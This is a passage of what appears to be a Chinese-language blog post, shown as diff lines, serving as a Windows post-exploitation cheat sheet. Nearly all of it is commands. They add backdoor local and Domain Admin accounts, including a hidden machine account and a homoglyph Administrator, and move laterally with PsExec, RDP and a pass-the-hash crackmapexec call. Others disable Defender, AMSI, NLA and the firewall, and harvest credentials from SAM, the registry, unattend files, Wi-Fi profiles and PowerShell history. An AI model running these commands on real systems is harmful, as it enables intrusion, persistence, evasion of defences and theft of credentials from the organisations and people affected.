+python DonPAPI.py -pvk domain_backupkey.pvk domain&#x2F;user:passw0rd@domain_network_list</code></pre>
+
+<h2 id="0x04-凭据使用"><a href="#0x04-凭据使用" class="headerlink" title="0x04 凭据使用"></a>0x04 凭据使用</h2><h3 id="1-创建凭据"><a href="#1-创建凭据" class="headerlink" title="1. 创建凭据"></a>1. 创建凭据</h3><pre class="language-none"><code class="language-none">net user hacker Hcker_12345678* &#x2F;add &#x2F;Y
+net localgroup administrators hacker &#x2F;add
+net localgroup &quot;Remote Desktop Users&quot; hacker &#x2F;add # RDP access
+net localgroup &quot;Backup Operators&quot; hacker &#x2F;add # Full access to files
+net group &quot;Domain Admins&quot; hacker &#x2F;add &#x2F;domain
+
+# enable a domain user account
+net user hacker &#x2F;ACTIVE:YES &#x2F;domain
+
+# prevent users from changing their password
+net user username &#x2F;Passwordchg:No
+
+# prevent the password to expire
+net user hacker &#x2F;Expires:Never
+
+# create a machine account (not shown in net users)
+net user &#x2F;add evilbob$ evilpassword
+
+# homoglyph Aԁmіnistratοr (different of Administrator)
+Aԁmіnistratοr</code></pre>
+
+<h3 id="2-凭据利用"><a href="#2-凭据利用" class="headerlink" title="2. 凭据利用"></a>2. 凭据利用</h3><pre class="language-none"><code class="language-none">1）PsExec
+
+PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
+
+# switch admin user to NT Authority&#x2F;System
+PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
+
+2）RDP协议
+
+# Enable RDP
+PS C:\&gt; reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0x00000000 &#x2F;f
+PS C:\&gt; netsh firewall set service remoteadmin enable
+PS C:\&gt; netsh firewall set service remotedesktop enable
+# Alternative
+C:\&gt; psexec \\machinename reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; &#x2F;f &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0
+root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION&#x3D;enable
+
+# Fix CredSSP errors
+reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f
+reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f
+
+# Disable NLA
+PS &gt; (Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName &quot;PC01&quot; -Filter &quot;TerminalName&#x3D;&#39;RDP-tcp&#39;&quot;).UserAuthenticationRequired
+PS &gt; (Get-WmiObject -class &quot;Win32_TSGeneralSetting&quot; -Namespace root\cimv2\terminalservices -ComputerName &quot;PC01&quot; -Filter &quot;TerminalName&#x3D;&#39;RDP-tcp&#39;&quot;).SetUserAuthenticationRequired(0)
+
+3）Netuse
+
+PS C:\&gt; net use \\ordws01.cscou.lab &#x2F;user:DOMAIN\username password C$
+
+4）Runas
+
+PS C:\&gt; runas &#x2F;netonly &#x2F;user:DOMAIN\username &quot;cmd.exe&quot;
+PS C:\&gt; runas &#x2F;noprofil &#x2F;netonly &#x2F;user:DOMAIN\username cmd.exe</code></pre>
+
+<h2 id="0x05-权限提升"><a href="#0x05-权限提升" class="headerlink" title="0x05 权限提升"></a>0x05 权限提升</h2><h3 id="1-基础信息收集"><a href="#1-基础信息收集" class="headerlink" title="1. 基础信息收集"></a>1. 基础信息收集</h3><pre class="language-none"><code class="language-none">1）版本配置信息
+
+systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;
+
+wmic qfe  # 补丁更新信息
+
+wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%  # 体系架构
+
+set  # 环境变量
+Get-ChildItem Env: | ft Key,Value
+
+wmic logicaldisk get caption || fsutil fsinfo drives   # 驱动信息
+wmic logicaldisk get caption,description,providername
+Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root
+
+2）用户枚举
+
+echo %USERNAME% || whoami  # 获取当前用户名
+$env:username
+
+whoami &#x2F;priv  # 查看用户权限
+whoami &#x2F;groups
+
+net user      # 列举所有用户
+whoami &#x2F;all
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+
+net accounts  # 查看登录限制
+
+net user administrator  # 获取用户详细信息
+net user admin
+net user %USERNAME%
+
+net localgroup          # 枚举本地用户组
+Get-LocalGroup | ft Name
+
+net localgroup administrators  # 查看用户组详细信息
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
+
+nltest &#x2F;DCLIST:DomainName  # 枚举域控用户
+nltest &#x2F;DCNAME:DomainName
+nltest &#x2F;DSGETDC:DomainName
+
+3）网络枚举
+
+ipconfig &#x2F;all   # 查看网络网卡、ip、DNS信息
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+
+route print     # 查看当前路由表信息
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+
+arp -A  # 查看ARP信息
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+
+netstat -ano # 查看当前连接
+
+net share   # 查看网络共享信息
+powershell Find-DomainShare -ComputerDomain domain.local
+
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP &#x2F;s  # SNMP配置信息
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+
+4）杀软信息
+
+a. Windows Defender
+
+# check status of Defender
+PS C:\&gt; Get-MpComputerStatus
+
+# disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\&gt; Set-MpPreference -DisableIOAVProtection $true
+
+# disable AMSI (set to 0 to enable)
+PS C:\&gt; Set-MpPreference -DisableScriptScanning 1 
+
+# exclude a folder
+PS C:\&gt; Add-MpPreference -ExclusionPath &quot;C:\Temp&quot;
+PS C:\&gt; Add-MpPreference -ExclusionPath &quot;C:\Windows\Tasks&quot;
+PS C:\&gt; Set-MpPreference -ExclusionProcess &quot;word.exe&quot;, &quot;vmwp.exe&quot;
+
+# remove signatures (if Internet connection is present, they will be downloaded again):
+PS &gt; &amp; &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot; -RemoveDefinitions -All
+PS &gt; &amp; &quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All
+
+b. Firewall
+
+# 列举防火墙状态和配置
+netsh advfirewall firewall dump
+netsh firewall show state
+netsh firewall show config
+
+# 列举防火墙封禁端口
+$f&#x3D;New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where &#123;$_.action -eq &quot;0&quot;&#125; | select name,applicationname,localports
+
+# 关闭防火墙
+reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server&quot;  &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f  # Win7 环境
+
+powershell.exe -ExecutionPolicy Bypass -command &#39;Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; –Value&#39;&#96;
+
+netsh firewall set opmode disable   # 所有环境
+netsh Advfirewall set allprofiles state off
+
+c. AppLocker枚举
+
+PowerView PS C:\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+d. 默认可写文件
+
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\spool\printers
+C:\Windows\System32\spool\servers
+C:\Windows\tracing
+C:\Windows\Temp
+C:\Users\Public
+C:\Windows\Tasks
+C:\Windows\System32\tasks
+C:\Windows\SysWOW64\tasks
+C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
+C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
+C:\Windows\debug\wia
+C:\Windows\registration\crmlog
+C:\Windows\System32\com\dmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\System32\fxstmp
+C:\Windows\SysWOW64\fxstmp</code></pre>
+
+<h3 id="2-密码查找"><a href="#2-密码查找" class="headerlink" title="2. 密码查找"></a>2. 密码查找</h3><pre class="language-none"><code class="language-none">1）SAM&#x2F;SYSTEM文件
+
+# Usually %SYSTEMROOT% &#x3D; C:\Windows # 文件所在位置
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+# 导出hash文件
+pwdump SYSTEM SAM &gt; &#x2F;root&#x2F;sam.txt
+samdump2 SYSTEM SAM -o sam.txt
+
+2）文件内容查找
+
+cd C:\ &amp; findstr &#x2F;SI &#x2F;M &quot;password&quot; *.xml *.ini *.txt
+findstr &#x2F;si password *.xml *.ini *.txt *.config
+findstr &#x2F;spin &quot;password&quot; *.*
+dir &#x2F;S &#x2F;B *pass*.txt &#x3D;&#x3D; *pass*.xml &#x3D;&#x3D; *pass*.ini &#x3D;&#x3D; *cred* &#x3D;&#x3D; *vnc* &#x3D;&#x3D; *.config*
+where &#x2F;R C:\ user.txt
+where &#x2F;R C:\ *.ini
+
+3）从注册表查找
+
+REG QUERY HKLM &#x2F;F &quot;password&quot; &#x2F;t REG_SZ &#x2F;S &#x2F;K
+REG QUERY HKCU &#x2F;F &quot;password&quot; &#x2F;t REG_SZ &#x2F;S &#x2F;K
+
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; # Windows Autologin
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot; 
+reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot; # SNMP parameters
+reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; # Putty clear text proxy credentials
+reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot; # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 &#x2F;v password
+
+reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s
+reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s
+
+REG QUERY &quot;HKLM\Software\Microsoft\FTH&quot; &#x2F;V RuleList
+
+4）从xml文件查找
+
+# unattend.xml文件位置
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+dir &#x2F;s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul # 查找
+
+5）IIS Web配置
+
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+
+6）其他配置文件
+
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+dir c:*vnc.ini &#x2F;s &#x2F;b
+dir c:*ultravnc.ini &#x2F;s &#x2F;b
+
+7）Wifi密码查找
+
+netsh wlan show profile   # AP SSID
+
+netsh wlan show profile &lt;SSID&gt; key&#x3D;clear  # Cleartext Pass
+
+cls &amp; echo. &amp; for &#x2F;f &quot;tokens&#x3D;4 delims&#x3D;: &quot; %a in (&#39;netsh wlan show profiles ^| find &quot;Profile &quot;&#39;) do @echo off &gt; nul &amp; (netsh wlan show profiles name&#x3D;%a key&#x3D;clear | findstr &quot;SSID Cipher Content&quot; | find &#x2F;v &quot;Number&quot; &amp; echo.) &amp; @echo on
+
+8）粘贴版密码
+
+所在位置：C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+
+9）存储用户密码查看
+
+rundll32 keymgr,KRShowKeyMgr
+
+10）Powershell历史命令
+
+关闭命令：Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+
+11）数据流密码获取
+
+PS &gt; Get-Item -path flag.txt -Stream *
+PS &gt; Get-Content -path flag.txt -Stream Flag</code></pre>
+
+<h3 id="3-进程-x2F-服务枚举"><a href="#3-进程-x2F-服务枚举" class="headerlink" title="3. 进程&#x2F;服务枚举"></a>3. 进程&#x2F;服务枚举</h3><pre class="language-none"><code class="language-none">1）查看运行进程
+
+tasklist &#x2F;v
+net start
+sc query
+Get-Service
+Get-Process
+Get-WmiObject -Query &quot;Select * from Win32_Process&quot; | where &#123;$_.Name -notlike &quot;svchost*&quot;&#125; | Select Name, Handle, @&#123;Label&#x3D;&quot;Owner&quot;;Expression&#x3D;&#123;$_.GetOwner().User&#125;&#125; | ft -AutoSize
+
+2）查看system服务进程
+
+tasklist &#x2F;v &#x2F;fi &quot;username eq system&quot;
+
+3）列举已安装程序
+
+Get-ChildItem &#39;C:\Program Files&#39;, &#39;C:\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
+4）列举services
+
+net start
+wmic service list brief
+tasklist &#x2F;SVC
+
+5）列举计划任务
+
+schtasks &#x2F;query &#x2F;fo LIST 2&gt;nul | findstr TaskName
+schtasks &#x2F;query &#x2F;fo LIST &#x2F;v &gt; schtasks.txt; cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM
+Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State
+
+6）查看自启动任务
+
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;
+dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</code></pre>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/88661/" rel="next" title="Windows 栽荷投递姿势">
+                  Windows 栽荷投递姿势 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
